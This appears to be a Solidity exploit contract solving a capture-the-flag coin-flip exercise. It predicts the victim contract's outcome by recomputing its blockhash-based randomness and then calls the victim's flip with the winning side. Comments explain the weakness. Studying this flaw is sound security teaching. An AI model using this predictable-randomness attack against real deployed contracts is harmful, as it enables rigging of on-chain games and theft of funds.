// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./coinflip.sol";

contract CoinFlipAttack {

    CoinFlip public victimContract;
    uint256 Factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    // To get the same answer as the victim contract thats why we need to use the same factor

    // init the victim contract,
    //not using new keyword because we want to use the same contract address and
    //not create a new instance of the contract
    constructor(address _victimContract) {
        victimContract = CoinFlip(_victimContract); // the right logic says that we need to use the same address as the victim contract
    }

// This function flip is mimicking the flip function in the victim contract
    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1)); // the problem is here

        uint256 coinFlip = blockValue / Factor; 
        bool side = coinFlip == 1 ? true : false;

        // we are running the exact same functionality before we call the flip function in the victim contract
        // and that will give us the same result as the victim contract
        return victimContract.flip(side);
    }
}

// CoinFlip(_victimContract) is the same as new CoinFlip() but we are using the same address as the victim contract